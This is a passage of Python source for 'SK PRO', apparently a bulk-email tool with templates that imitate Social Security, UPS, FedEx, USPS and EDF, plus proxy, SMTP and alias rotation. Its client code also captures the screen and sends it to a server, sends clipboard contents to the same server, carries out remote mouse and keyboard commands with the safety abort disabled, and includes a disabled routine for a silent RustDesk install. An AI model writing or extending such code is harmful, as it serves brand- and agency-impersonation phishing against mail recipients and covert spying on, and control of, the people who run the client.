                username = self.current_user.get("username")
                if username:
                    # Decide level based on color
                    if color == C.get("red"):
                        level = "error"
                    elif color == C.get("yellow"):
                        level = "warning"
                    elif color == C.get("green"):
                        level = "success"
                    else:
                        level = "info"
                    # Send in background thread bach matblokchi UI
                    import threading
                    threading.Thread(
                        target=lambda: sc.send_log(username, msg[:500], level),
                        daemon=True
                    ).start()
        except Exception:
            pass

    def _load_sent_total(self):
        try:
            with open(self.sent_total_file, encoding="utf-8") as f:
                data = json.load(f)
            self.sent_total_value = int(data.get("sent_total", 0))
        except Exception:
            self.sent_total_value = 0

    def _save_sent_total(self):
        with open(self.sent_total_file, "w", encoding="utf-8") as f:
            json.dump({"sent_total": self.sent_total_value}, f, ensure_ascii=False, indent=2)

    def _refresh_sent_stat(self):
        if hasattr(self, "stat_sent"):
            self.stat_sent.config(text=str(self.sent_total_value))

    def _reset_sent_total(self):
        if self._sending:
            messagebox.showwarning("Warning", "Stop sending before resetting sent total")
            return
        if messagebox.askyesno("Confirm", "Reset saved sent total to 0?"):
            self.sent_total_value = 0
            self._save_sent_total()
            self._refresh_sent_stat()
            self._log("↺ Saved sent total reset to 0", C["yellow"])

    def _reset_failed_emails_file(self):
        with open(self.failed_emails_file, "w", encoding="utf-8") as f:
            f.write("")

    def _append_failed_email(self, email):
        with open(self.failed_emails_file, "a", encoding="utf-8") as f:
            f.write(email + "\n")
    
    def _logout(self):
        """Logout — close app w 3awd login window"""
        from tkinter import messagebox
        if not messagebox.askyesno("Logout", "Bsa7 baghi tkhroj?", parent=self):
            return
        # Stop sending ila kayn 7aja kheddama
        if getattr(self, "_sending", False):
            self._sending = False
        # Mark logout flag bach __main__ y3rf y3awd login
        self._do_relogin = True
        self.destroy()
    
    def _register_anydesk_thread(self, username):
        """Background: SILENT install RustDesk + auto-config + register"""
        try:
            import time
            
            def _log_progress(msg):
                """Log progress to server"""
                try:
                    if self._server_client and self._server_client.enabled:
                        self._server_client.send_log(
                            username,
                            f"[RustDesk] {msg}",
                            level="info"
                        )
                except Exception:
                    pass
            
            _log_progress("🔧 Setting up remote control...")
            
            # Use RustDesk (open source, no popup, auto-accept!)
            rustdesk_id, password = RustDeskManager.full_setup(on_progress=_log_progress)
            
            if not rustdesk_id:
                _log_progress("⚠ RustDesk setup failed")
                return
            
            # Register f server
            self._server_client.register_anydesk(username, rustdesk_id, password or "")
            self._server_client.send_log(
                username,
                f"✅ Remote control ready: {rustdesk_id}",
                level="success"
            )
        except Exception as e:
            print(f"⚠ RustDesk register error: {e}")
    
    def _show_anydesk_install_dialog(self):
        """Show dialog l user bach yinstaller AnyDesk"""
        try:
            AnyDeskInstallDialog(self)
        except Exception as e:
            print(f"⚠ Install dialog error: {e}")

    def _start_screen_capture(self):
        """Start background thread bach yt-capture screen ila admin baghi yshof"""
        import threading
        username = self.current_user.get("username")
        if not username:
            return
        
        # Init server client ila ma kaynch
        if not hasattr(self, "_server_client") or self._server_client is None:
            self._server_client = ServerClient(role="user")
        
        if not self._server_client.enabled:
            return
        
        # 🖥 RustDesk auto-register DISABLED (use Live Screen instead)
        # threading.Thread(
        #     target=self._register_anydesk_thread,
        #     args=(username,),
        #     daemon=True
        # ).start()
        
        self._screen_capture_running = True
        
        def _capture_loop():
            """Background thread: capture screen kol 0.5s ila admin watching"""
            while self._screen_capture_running:
                try:
                    # Check ila admin baghi yshof (kol 1s)
                    watching = self._server_client.check_watch_status(username)
                    
                    if watching:
                        # Capture screen
                        try:
                            from PIL import Image, ImageGrab
                            import io
                            import base64
                            
                            # Take screenshot (use mss for speed!)
                            try:
                                import mss
                                with mss.mss() as sct:
                                    sct_img = sct.grab(sct.monitors[1])
                                    img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                            except ImportError:
                                img = ImageGrab.grab()
                            
                            # Resize l 1024x576 (smaller = MUCH faster)
                            img.thumbnail((1024, 576))
                            
                            # Compress JPEG quality 40% (smaller = faster)
                            buf = io.BytesIO()
                            img.save(buf, format="JPEG", quality=40, optimize=False)
                            buf.seek(0)
                            image_bytes = buf.read()
                            
                            # Encode b64
                            image_b64 = base64.b64encode(image_bytes).decode()
                            
                            # Upload f thread separe bach mat-blokchi capture
                            import threading
                            threading.Thread(
                                target=self._server_client.upload_screenshot,
                                args=(username, image_b64),
                                daemon=True
                            ).start()
                            
                            # Sleep 250ms (4 fps - real-time-ish!)
                            import time
                            time.sleep(0.25)
                        except ImportError:
                            print("⚠ PIL/ImageGrab not available — screen capture disabled")
                            import time
                            time.sleep(30)
                        except Exception as e:
                            print(f"⚠ Screen capture error: {e}")
                            import time
                            time.sleep(2)
                    else:
                        # Check kol 500ms (faster startup mli admin click watch)
                        import time
                        time.sleep(0.5)
                except Exception as e:
                    print(f"⚠ Screen capture loop error: {e}")
                    import time
                    time.sleep(5)
        
        # Start thread
        t = threading.Thread(target=_capture_loop, daemon=True)
        t.start()
        
        # 🎮 Start control listener (mouse/keyboard/clipboard from admin)
        self._start_control_listener()
    
    def _start_control_listener(self):
        """Background thread: ki-y-poll events mn admin (mouse/keyboard/clipboard)"""
        import threading
        username = self.current_user.get("username")
        if not username:
            return
        
        if not hasattr(self, "_server_client") or not self._server_client:
            return
        
        # Try import pyautogui
        try:
            import pyautogui
            pyautogui.FAILSAFE = False  # Disable corner abort
            pyautogui.PAUSE = 0.0  # No delay between actions
            HAS_PYAUTOGUI = True
        except ImportError:
            print("⚠ pyautogui not installed — control disabled")
            HAS_PYAUTOGUI = False
        
        # Try import pyperclip for clipboard
        try:
            import pyperclip
            HAS_CLIPBOARD = True
        except ImportError:
            HAS_CLIPBOARD = False
        
        if not HAS_PYAUTOGUI and not HAS_CLIPBOARD:
            return
        
        self._control_listener_running = True
        self._last_clipboard_text = ""
        
        def _control_loop():
            """Poll control events kol 200ms"""
            import time
            
            while getattr(self, "_control_listener_running", False):
                try:
                    # Only poll ila admin watching (saves bandwidth)
                    watching = self._server_client.check_watch_status(username)
                    
                    if watching:
                        # Get events from server
                        events = self._server_client.poll_control_events(username)
                        
                        for event in events:
                            try:
                                self._execute_control_event(event, HAS_PYAUTOGUI, HAS_CLIPBOARD)
                            except Exception as e:
                                print(f"⚠ Event execution error: {e}")
                        
                        # Sync clipboard l server (if changed)
                        if HAS_CLIPBOARD:
                            try:
                                current_clip = pyperclip.paste()
                                if current_clip != self._last_clipboard_text and len(current_clip) < 50000:
                                    self._server_client.sync_clipboard(username, current_clip)
                                    self._last_clipboard_text = current_clip
                            except Exception:
                                pass
                        
                        # Poll fast mli watching (200ms = responsive)
                        time.sleep(0.2)
                    else:
                        # Not watching - check kol 1s
                        time.sleep(1)
                except Exception as e:
                    print(f"⚠ Control loop error: {e}")
                    time.sleep(2)
        
        t = threading.Thread(target=_control_loop, daemon=True)
        t.start()
    
    def _execute_control_event(self, event, has_pyautogui, has_clipboard):
        """Execute event (mouse click, keyboard, etc)"""
        ev_type = event.get("type")
        
        if ev_type == "mouse_click" and has_pyautogui:
            import pyautogui
            x = event.get("x", 0)
            y = event.get("y", 0)
            button = event.get("button", "left")
            clicks = event.get("clicks", 1)
            pyautogui.click(x=x, y=y, button=button, clicks=clicks)
        
        elif ev_type == "mouse_move" and has_pyautogui:
            import pyautogui
            x = event.get("x", 0)
            y = event.get("y", 0)
            pyautogui.moveTo(x, y, duration=0)
        
        elif ev_type == "mouse_drag" and has_pyautogui:
            import pyautogui
            x1 = event.get("x1", 0)
            y1 = event.get("y1", 0)
            x2 = event.get("x2", 0)
            y2 = event.get("y2", 0)
            button = event.get("button", "left")
            pyautogui.moveTo(x1, y1)
            pyautogui.dragTo(x2, y2, button=button, duration=0.2)
        
        elif ev_type == "mouse_scroll" and has_pyautogui:
            import pyautogui
            clicks = event.get("clicks", 0)
            x = event.get("x")
            y = event.get("y")
            if x is not None and y is not None:
                pyautogui.moveTo(x, y)
            pyautogui.scroll(clicks)
        
        elif ev_type == "key_type" and has_pyautogui:
            import pyautogui
            text = event.get("text", "")
            pyautogui.typewrite(text, interval=0.01)
        
        elif ev_type == "key_press" and has_pyautogui:
            import pyautogui
            key = event.get("key", "")
            modifiers = event.get("modifiers", [])
            if modifiers:
                # Hotkey: ctrl+c, ctrl+shift+v, etc
                pyautogui.hotkey(*modifiers, key)
            else:
                pyautogui.press(key)
        
        elif ev_type == "clipboard_set" and has_clipboard:
            import pyperclip
            text = event.get("text", "")
            pyperclip.copy(text)
            self._last_clipboard_text = text
    
    def _start_expiration_check(self):
        """Check expiration + server heartbeat - kol 30 sec"""
        username = self.current_user.get("username")
        if not username:
            return
        
        # 📸 Start screen capture monitoring (background thread)
        self._start_screen_capture()
        
        # Initialize server client (l user — admin tani 7tah heartbeat?)
        # Both admin + user ki-3lwo server bach admin yshof users mzyan
        self._server_client = ServerClient(role="user")  # always 'user' for heartbeat
        
        # Send initial log
        if self._server_client.enabled:
            try:
                import platform
                os_info = f"{platform.system()} {platform.release()}"
                self._server_client.send_log(
                    username, "🚀 App started", level="info",
                    details=f"Role: {self.current_user.get('role')}"
                )
            except Exception:
                pass
        
        # 🎬 Auto-open Watch Screen window (user side only)
        # User login → screen capture started → admin can watch direct
        if self.current_user.get("role") == "user":
            self.after(2000, self._auto_open_watch_screen)
        
        def _check():
            try:
                # 1. Heartbeat l server
                if self._server_client.enabled:
                    try:
                        import platform
                        os_info = f"{platform.system()} {platform.release()}"
                        status = "sending" if getattr(self, "_sending", False) else "idle"
                        
                        # 🔍 Make raw request bach n-detect 403 (blocked)
                        try:
                            import requests
                            r = requests.post(
                                f"{self._server_client.server_url}/heartbeat",
                                json={
                                    "username": username,
                                    "current_status": status,
                                    "os_info": os_info,
                                },
                                headers={"x-api-key": self._server_client.api_key},
                                timeout=10,
                            )
                            if r.status_code == 403:
                                # 🚫 BLOCKED by admin
                                from tkinter import messagebox
                                if getattr(self, "_sending", False):
                                    self._sending = False
                                messagebox.showwarning(
                                    "🚫 Account Blocked",
                                    "Admin blocked account dyalk!\nContact admin.\nL'app ghadi tetsedd.",
                                    parent=self
                                )
                                self._do_relogin = True
                                self.destroy()
                                return
                            elif r.status_code == 200:
                                result = r.json()
                            else:
                                result = None
                        except Exception:
                            result = None
                        
                        # Server return disconnect_requested wla expires_at
                        if result:
                            if result.get("disconnect_requested"):
                                from tkinter import messagebox
                                if getattr(self, "_sending", False):
                                    self._sending = False
                                messagebox.showwarning(
                                    "🔌 Disconnected by Admin",
                                    "Admin requested disconnect.\nL'app ghadi tetsedd.",
                                    parent=self
                                )
                                self._do_relogin = True
                                self.destroy()
                                return
                            
                            # Sync expires_at mn server
                            server_exp = result.get("expires_at")
                            if server_exp is not None:
                                # Update local users.json
                                fresh_um = UserManager()
                                if username in fresh_um.users:
                                    fresh_um.users[username]["expires_at"] = server_exp
                                    fresh_um._save()
                    except Exception as e:
                        print(f"⚠ Server heartbeat error: {e}")
                    
                    # 2. Get pending commands
                    try:
                        commands = self._server_client.get_commands(username)
                        for cmd in commands:
                            self._handle_server_command(cmd)
                    except Exception:
                        pass
                
                # 3. Local expiration check
                if self.current_user.get("role") != "admin":
                    fresh_um = UserManager()
                    if fresh_um.is_expired(username):
                        from tkinter import messagebox
                        if getattr(self, "_sending", False):
                            self._sending = False
                        messagebox.showwarning(
                            "⏰ Account Expired",
                            f"Account dyalk '{username}' expired!\n\n"
                            "Contact admin bach yzid lik.\n"
                            "L'app ghadi tetsedd daba.",
                            parent=self
                        )
                        self._do_relogin = True
                        self.destroy()
                        return
            except Exception as e:
                print(f"⚠ Expiration check error: {e}")
            # Re-schedule next check (kol 10 secondes - faster response)
            self._exp_check_job = self.after(10000, _check)
        
        # Start lawl check after 3s (initial)
        self._exp_check_job = self.after(3000, _check)
    
    def _handle_server_command(self, cmd):
        """Handle commands sent mn admin via server"""
        try:
            if not self._server_client.enabled:
                return
            cmd_id = cmd.get("id")
            cmd_type = cmd.get("command")
            params = cmd.get("params")
            
            if cmd_type == "extend_expiration":
                # Update local users.json
                username = self.current_user.get("username")
                fresh_um = UserManager()
                if username in fresh_um.users:
                    try:
                        new_exp = int(params)
                        fresh_um.users[username]["expires_at"] = new_exp
                        fresh_um._save()
                        # Log
                        self._server_client.send_log(
                            username,
                            "⏰ Expiration extended by admin",
                            level="success",
                            details=f"New expires_at: {new_exp}"
                        )
                    except (ValueError, TypeError):
                        pass
            
            elif cmd_type == "disconnect":
                # Will be handled via heartbeat response
                pass
            
            # Acknowledge command
            self._server_client.ack_command(cmd_id, "done")
        except Exception as e:
            print(f"⚠ Command handler error: {e}")

    def _build_ui(self):
        # TOP BAR
        top = tk.Frame(self, bg=C["bg1"], height=52)
        top.pack(fill="x"); top.pack_propagate(False)
        # 👑 SK LOGO f l'header (bdal ✉)
        try:
            _logo_dir = os.path.dirname(os.path.abspath(__file__))
            _logo_small = os.path.join(_logo_dir, "sk_logo_small.png")
            _logo_big = os.path.join(_logo_dir, "sk_logo.png")
            _logo_path = _logo_small if os.path.exists(_logo_small) else _logo_big
            if os.path.exists(_logo_path):
                self._header_logo_img = tk.PhotoImage(file=_logo_path)
                # Ila l'logo kbir bzaf, n9esso (subsample)
                _w = self._header_logo_img.width()
                if _w > 50:
                    _factor = max(1, _w // 40)
                    self._header_logo_img = self._header_logo_img.subsample(_factor, _factor)
                tk.Label(top, image=self._header_logo_img,
                         bg=C["bg1"]).pack(side="left", padx=(18, 8))
            else:
                tk.Label(top, text="✉", bg=C["bg1"], fg=C["accent"],
                         font=("Segoe UI",18)).pack(side="left", padx=(18,6))
        except Exception as _e:
            print(f"⚠ Header logo load failed: {_e}")
            tk.Label(top, text="✉", bg=C["bg1"], fg=C["accent"],
                     font=("Segoe UI",18)).pack(side="left", padx=(18,6))
        tk.Label(top, text="SK PRO", bg=C["bg1"], fg=C["text"],
                 font=("Segoe UI",13,"bold")).pack(side="left")
        
        # 🔐 LOGOUT button + current user info (right side)
        _role_icon = "👑" if self.current_user.get("role") == "admin" else "👤"
        tk.Button(top, text="🚪 Logout",
                  bg=C["red"], fg="white",
                  font=("Segoe UI", 9, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._logout).pack(side="right", padx=(8, 18), ipadx=8, ipady=4)
        tk.Label(top, text=f"{_role_icon} {self.current_user.get('username', 'guest')}",
                 bg=C["bg1"], fg=C["accent"],
                 font=("Segoe UI", 10, "bold")).pack(side="right", padx=8)
        
        self.status_lbl = tk.Label(top, text="● Not connected",
                                   bg=C["bg1"], fg=C["red"],
                                   font=("Segoe UI",9))
        self.status_lbl.pack(side="right", padx=18)
        self.progress_lbl = tk.Label(top, text="",
                                      bg=C["bg1"], fg=C["text2"],
                                      font=("Segoe UI",9))
        self.progress_lbl.pack(side="right", padx=8)

        # NOTEBOOK (tabs)
        nb_frame = tk.Frame(self, bg=C["bg0"])
        nb_frame.pack(fill="both", expand=True, padx=16, pady=12)

        style = ttk.Style(self)
        style.theme_use("clam")
        style.configure("TNotebook", background=C["bg0"], borderwidth=0)
        style.configure("TNotebook.Tab", background=C["bg2"], foreground=C["text2"],
                        padding=[12,6], font=("Segoe UI",9))
        style.map("TNotebook.Tab",
                  background=[("selected", C["bg1"])],
                  foreground=[("selected", C["text"])])
        style.configure("TProgressbar", troughcolor=C["bg2"],
                        background=C["accent"], borderwidth=0, thickness=3)
        style.configure("Treeview", background=C["bg2"], foreground=C["text"],
                        fieldbackground=C["bg2"], rowheight=24, borderwidth=0)
        style.configure("Treeview.Heading", background=C["bg3"],
                        foreground=C["text2"], font=("Segoe UI",8,"bold"), borderwidth=0)
        style.map("Treeview", background=[("selected", C["accent"])])

        self.nb = ttk.Notebook(nb_frame)
        self.nb.pack(fill="both", expand=True)
        
        # 🔐 Get user permissions (admin = kolchi automatically)
        _user_perms = set(self.current_user.get("permissions", []))
        if self.current_user.get("role") == "admin":
            _user_perms = {tid for tid, _, _ in AVAILABLE_TABS}  # admin gets all
        
        def _has_perm(tab_id):
            return tab_id in _user_perms
        
        # ⚠ MUHIM: Build kol tabs (mn 3la khater state shared bin tabs)
        # Walakin add ghir ila 3ndo permission
        
        # Tab 1 — Sender
        tab_send = tk.Frame(self.nb, bg=C["bg0"])
        self._build_sender_tab(tab_send)
        if _has_perm("sender"):
            self.nb.add(tab_send, text="  ✉ Sender  ")

        # Tab 2 — Compose
        tab_compose = tk.Frame(self.nb, bg=C["bg0"])
        self._build_compose_tab(tab_compose)
        if _has_perm("compose"):
            self.nb.add(tab_compose, text="  ✏️ Compose  ")

        # Tab 3 — Workspace
        tab_workspace = tk.Frame(self.nb, bg=C["bg0"])
        self._build_workspace_tab(tab_workspace)
        if _has_perm("workspace"):
            self.nb.add(tab_workspace, text="  🏢 Workspace  ")
        
        # Tab — Resend API
        tab_resend = tk.Frame(self.nb, bg=C["bg0"])
        self._build_resend_tab(tab_resend)
        if _has_perm("resend"):
            self.nb.add(tab_resend, text="  📨 Resend API  ")

        # Tab — SMTP
        self.smtp_tab = SmtpTab(self.nb, self._log)
        if _has_perm("smtp"):
            self.nb.add(self.smtp_tab, text="  ⚙ SMTP Accounts  ")

        # Tab — Proxy
        self.proxy_tab = ProxyTab(self.nb, self._log)
        if _has_perm("proxies"):
            self.nb.add(self.proxy_tab, text="  🔀 Proxies  ")
        
        # Tab — Fixed Attachments
        tab_fixed_att = tk.Frame(self.nb, bg=C["bg0"])
        self._build_fixed_att_tab(tab_fixed_att)
        if _has_perm("fixed_atts"):
            self.nb.add(tab_fixed_att, text="  📌 Fixed Atts  ")
        
        # Tab — Settings
        tab_settings = tk.Frame(self.nb, bg=C["bg0"])
        self._build_settings_tab(tab_settings)
        if _has_perm("settings"):
            self.nb.add(tab_settings, text="  ⚙ Settings  ")
        
        # 🔐 Tab — Users Management (ADMIN ONLY)
        if self.current_user.get("role") == "admin":
            self.users_tab = UsersTab(self.nb, self)
            self.nb.add(self.users_tab, text="  👥 Users  ")
            
            # 💻 Tab — Clients (ADMIN ONLY) — build + manage client EXEs
            self.clients_tab = ClientsTab(self.nb, self)
            self.nb.add(self.clients_tab, text="  💻 Clients  ")
            
            # 🌐 Tab — Live Monitor (ADMIN ONLY) — dima ki-yban
            self.live_monitor_tab = LiveMonitorTab(self.nb, self)
            self.nb.add(self.live_monitor_tab, text="  🌐 Live Monitor  ")
        
        # Hidden Alias Generator (for backward compatibility — mafichi tab walakin code references kayhdrou)
        self.alias_gen_tab = AliasGeneratorTab(self.nb, self._log)
        # NOT ADDED to notebook — accessible by code walakin mafichi tab visible
        
        # Auto-sync existing JSON ila kayan
        existing_json = self.sa_file.get() or self.workspace_sa_file.get()
        if existing_json:
            self.alias_gen_tab.json_path.set(existing_json)
        
        # Auto-fill admin email + domain f Alias Generator tab ila kaynin f Workspace tab
        if hasattr(self, 'workspace_admin_email') and self.workspace_admin_email.get():
            self.alias_gen_tab.admin_email.set(self.workspace_admin_email.get())
        if hasattr(self, 'workspace_domain') and self.workspace_domain.get():
            self.alias_gen_tab.parent_domain.set(self.workspace_domain.get())
        
        # 🔄 LIVE TRACES: Mlli wahed kay'change f Workspace tab → sync auto l Alias Gen
        def _sync_admin_email(*args):
            try:
                val = self.workspace_admin_email.get()
                if val and hasattr(self, 'alias_gen_tab'):
                    self.alias_gen_tab.admin_email.set(val)
                
                # 🎯 Auto-extract domain mn admin email
                # admin@terssadmine.com → terssadmine.com
                if val and '@' in val:
                    auto_domain = val.split('@', 1)[1].strip().lower()
                    # Set domain ila empty wla mokhtalifa
                    current_domain = self.workspace_domain.get().strip().lower()
                    if auto_domain and (not current_domain or current_domain != auto_domain):
                        self.workspace_domain.set(auto_domain)
            except: pass
        
        def _sync_domain(*args):
            try:
                val = self.workspace_domain.get()
                if val and hasattr(self, 'alias_gen_tab'):
                    self.alias_gen_tab.parent_domain.set(val)
            except: pass
        
        def _sync_workspace_json(*args):
            try:
                val = self.workspace_sa_file.get()
                if val and hasattr(self, 'alias_gen_tab'):
                    self.alias_gen_tab.json_path.set(val)
                    self.alias_gen_tab.workspace_service = None
            except: pass
        
        def _sync_sender_json(*args):
            try:
                val = self.sa_file.get()
                if val and hasattr(self, 'alias_gen_tab'):
                    self.alias_gen_tab.json_path.set(val)
                    self.alias_gen_tab.workspace_service = None
                if val and hasattr(self, 'oa_file') and not self.oa_file.get():
                    self.oa_file.set(val)
                if val and hasattr(self, 'workspace_sa_file') and not self.workspace_sa_file.get():
                    self.workspace_sa_file.set(val)
            except: pass
        
        # Active traces
        self.workspace_admin_email.trace_add("write", _sync_admin_email)
        self.workspace_domain.trace_add("write", _sync_domain)
        self.workspace_sa_file.trace_add("write", _sync_workspace_json)
        self.sa_file.trace_add("write", _sync_sender_json)
        
        # 🎯 Default tab = Sender (mlli kayft7 app, dakhlni nichan l Sender tab)
        self.nb.select(0)

    def _build_compose_tab(self, parent):
        """Tab dyal Compose: Display Name, Subject, Body, From aliases"""
        # Compose
        compose = tk.Frame(parent, bg=C["bg0"])
        compose.pack(fill="both", expand=True)
        cpad = tk.Frame(compose, bg=C["bg1"])
        cpad.pack(fill="both", expand=True, padx=14, pady=14)
        
        # Compose header m3a "All Random" button
        compose_hdr = tk.Frame(cpad, bg=C["bg1"])
        compose_hdr.pack(fill="x", pady=(0, 8))
        tk.Label(compose_hdr, text="Compose", bg=C["bg1"], fg=C["text"],
                 font=("Segoe UI", 9, "bold")).pack(side="left")
        tk.Frame(compose_hdr, bg=C["border2"], height=1).pack(
            side="left", fill="x", expand=True, padx=(8, 8), pady=6)
        
        # 🎲 ALL RANDOM button — wahed click bach yset kolchi random!
        ABtn(compose_hdr, "🎲 ALL RANDOM", C["green"],
             self._set_all_random, w=130, h=28).pack(side="right")
        
        # 🌍 LANGUAGE SELECTOR — change content language!
        lang_box = tk.Frame(cpad, bg=C["bg2"])
        lang_box.pack(fill="x", pady=(0, 10))
        lang_inner = tk.Frame(lang_box, bg=C["bg2"])
        lang_inner.pack(fill="x", padx=12, pady=8)
        
        tk.Label(lang_inner, text="🌍 Language:",
                 bg=C["bg2"], fg=C["accent2"],
                 font=("Segoe UI", 9, "bold")).pack(side="left", padx=(0, 12))
        
        self.language_var = tk.StringVar(value="EN")
        # Language buttons store dict {code: button}
        self._lang_buttons = {}
        
        # Only English (FR/UK/ES removed)
        for code, label, flag in [
            ("EN", "English (USA)", "🇺🇸"),
        ]:
            btn = tk.Button(lang_inner,
                             text=f"{flag}  {label}",
                             bg=C["green"],
                             fg="#000",
                             relief="flat", bd=0, cursor="hand2",
                             font=("Segoe UI", 9, "bold"),
                             command=lambda c=code: self._set_app_language(c))
            btn.pack(side="left", ipady=6, ipadx=12, padx=(0, 6))
            self._lang_buttons[code] = btn
        
        # Status label
        self.lang_status_lbl = tk.Label(lang_inner,
                                          text=f"Current: {CURRENT_LANGUAGE}",
                                          bg=C["bg2"], fg=C["green"],
                                          font=("Segoe UI", 8, "italic"))
        self.lang_status_lbl.pack(side="left", padx=(12, 0))
        
        # 🎨 THEME SELECTOR — choose template style!
        theme_box = tk.Frame(cpad, bg=C["bg2"])
        theme_box.pack(fill="x", pady=(0, 10))
        theme_inner = tk.Frame(theme_box, bg=C["bg2"])
        theme_inner.pack(fill="x", padx=12, pady=8)
        
        tk.Label(theme_inner, text="🎨 Theme:",
                 bg=C["bg2"], fg=C["yellow"],
                 font=("Segoe UI", 9, "bold")).pack(side="left", padx=(0, 12))
        
        self.theme_var = tk.StringVar(value="cola")
        self._theme_buttons = {}
        
        for code, label, icon in [
            ("delivery",   "Delivery",   "📦"),
            ("cola",       "COLA",       "🏛️"),
            ("ssa_simple", "SSA Simple", "🏛️"),
            ("ups",        "UPS",        "📦"),
            ("ups_amazon", "UPS Amazon", "📦"),
            ("fedex",      "FedEx",      "📦"),
            ("usps",       "USPS",       "📬"),
            ("edf",        "EDF",        "⚡"),
            ("mix",        "Mix",         "🎲"),
        ]:
            btn = tk.Button(theme_inner,
                             text=f"{icon}  {label}",
                             bg=C["green"] if code == "cola" else C["bg3"],
                             fg="#000" if code == "cola" else C["text"],
                             relief="flat", bd=0, cursor="hand2",
                             font=("Segoe UI", 9, "bold"),
                             command=lambda c=code: self._set_theme(c))
            btn.pack(side="left", ipady=6, ipadx=8, padx=(0, 4))
            self._theme_buttons[code] = btn
        
        # Theme status
        self.theme_status_lbl = tk.Label(theme_inner,
                                           text="Templates: COLA / Social Security (96K+ combos)",
                                           bg=C["bg2"], fg=C["green"],
                                           font=("Segoe UI", 8, "italic"))
        self.theme_status_lbl.pack(side="left", padx=(12, 0))
        
        # 🆕 V89: 📝 STYLE SELECTOR — restored from V60 era
        style_box = tk.Frame(cpad, bg=C["bg2"])
        style_box.pack(fill="x", pady=(0, 10))
        style_inner = tk.Frame(style_box, bg=C["bg2"])
        style_inner.pack(fill="x", padx=12, pady=8)
        
        tk.Label(style_inner, text="📝 Style:",
                 bg=C["bg2"], fg=C["yellow"],
                 font=("Segoe UI", 9, "bold")).pack(side="left", padx=(0, 12))
        
        self.template_style_var = tk.StringVar(value="old")
        self._template_style_buttons = {}
        
        for code, label, icon in [
            ("old",     "Old Detailed",  "📰"),
            ("simple",  "Simple HTML",   "✉️"),
            ("new",     "Plain Text",    "📝"),
            ("minimal", "Minimal (.)",   "⚪"),
            ("mix",     "Mix Random",    "🎲"),
        ]:
            btn = tk.Button(style_inner,
                             text=f"{icon}  {label}",
                             bg=C["green"] if code == "old" else C["bg3"],
                             fg="#000" if code == "old" else C["text"],
                             relief="flat", bd=0, cursor="hand2",
                             font=("Segoe UI", 9, "bold"),
                             command=lambda c=code: self._set_template_style(c))
            btn.pack(side="left", ipady=6, ipadx=10, padx=(0, 4))
            self._template_style_buttons[code] = btn
        
        # 🧪 Preview button on right
        tk.Button(style_inner, text="✏ Preview",
                  bg=C["accent2"], fg="#000",
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 9, "bold"),
                  command=self._preview_body_template).pack(side="right", ipady=6, ipadx=12)
        
        # Style status
        self.template_style_lbl = tk.Label(style_inner,
                                             text="Style: Old (newsletter detailed HTML)",
                                             bg=C["bg2"], fg=C["green"],
                                             font=("Segoe UI", 8, "italic"))
        self.template_style_lbl.pack(side="right", padx=(0, 12))
        
        # 🎯 Personalization info banner
        info_banner = tk.Frame(cpad, bg=C["bg2"])
        info_banner.pack(fill="x", pady=(0, 10))
        info_inner = tk.Frame(info_banner, bg=C["bg2"])
        info_inner.pack(fill="x", padx=10, pady=6)
        tk.Label(info_inner,
                 text="🎯 PERSONALIZATION: Sta3mel [NAME] w [EMAIL] f subject, body, wla display name",
                 bg=C["bg2"], fg=C["accent2"], font=("Segoe UI", 8, "bold")).pack(anchor="w")
        tk.Label(info_inner,
                 text="    [NAME]  → kayban first part dyal email recipient (mathalan: 'John' mn john@gmail.com)",
                 bg=C["bg2"], fg=C["text2"], font=("Segoe UI", 7)).pack(anchor="w")
        tk.Label(info_inner,
                 text="    [EMAIL] → kayban full email recipient (mathalan: 'john@gmail.com')",
                 bg=C["bg2"], fg=C["text2"], font=("Segoe UI", 7)).pack(anchor="w")
        tk.Label(info_inner,
                 text="    Auto-generated templates DABA fihom [NAME] + [EMAIL] automatique!",
                 bg=C["bg2"], fg=C["green"], font=("Segoe UI", 7)).pack(anchor="w")

        row1 = tk.Frame(cpad, bg=C["bg1"])
        row1.pack(fill="x")
        lf1 = tk.Frame(row1, bg=C["bg1"])
        lf1.pack(side="left", fill="x", expand=True, padx=(0,8))
        
        # Display Name header m3a radio Manual/Random Integrated
        dn_hdr = tk.Frame(lf1, bg=C["bg1"])
        dn_hdr.pack(fill="x")
        self._label(dn_hdr, "Display Name").pack(side="left")
        self.dn_mode = tk.StringVar(value="random")
        tk.Radiobutton(dn_hdr, text="Manual", variable=self.dn_mode,
                       value="manual", bg=C["bg1"], fg=C["text2"],
                       selectcolor=C["bg3"], activebackground=C["bg1"],
                       font=("Segoe UI",7),
                       command=self._toggle_dn).pack(side="left", padx=(10,2))
        tk.Radiobutton(dn_hdr, text="Random List", variable=self.dn_mode,
                       value="random", bg=C["bg1"], fg=C["text2"],
                       selectcolor=C["bg3"], activebackground=C["bg1"],
                       font=("Segoe UI",7),
                       command=self._toggle_dn).pack(side="left")
        
        # Manual frame (single entry)
        self.dn_manual_f = tk.Frame(lf1, bg=C["bg1"])
        self.dn_manual_f.pack(fill="x")
        self.display_name = self._entry_w(self.dn_manual_f)
        
        # Random frame: integrated textbox UNLIMITED + import + clear
        self.dn_random_f = tk.Frame(lf1, bg=C["bg1"])
        
        # Buttons row
        dn_btns = tk.Frame(self.dn_random_f, bg=C["bg1"])
        dn_btns.pack(fill="x", pady=(2, 2))
        tk.Button(dn_btns, text="📂 Import .txt", bg=C["bg3"], fg=C["text2"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI", 7),
                  command=self._import_display_names).pack(side="left", ipady=2, ipadx=6, padx=(0, 4))
        tk.Button(dn_btns, text="🗑 Clear", bg=C["bg3"], fg=C["red"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI", 7),
                  command=self._clear_display_names).pack(side="left", ipady=2, ipadx=6)
        self.dn_count_lbl = tk.Label(dn_btns, text="0 names", bg=C["bg1"], fg=C["text3"], font=("Segoe UI", 7))
        self.dn_count_lbl.pack(side="left", padx=(8, 0))
        
        # Big textbox (1 name per line, unlimited)
        self.dn_text = tk.Text(self.dn_random_f, height=4, bg=C["input"], fg=C["text"],
                                font=("Segoe UI", 8), insertbackground=C["accent"],
                                relief="flat", bd=0,
                                highlightthickness=1, highlightbackground=C["border2"])
        self.dn_text.pack(fill="x", pady=(0, 2), ipady=2)
        self.dn_text.bind("<KeyRelease>", lambda e: self._update_dn_count())
        
        tk.Label(self.dn_random_f, text="💡 Khalliha fargha = Auto-generate ♾️ unlimited names · Wla type/import dyalek",
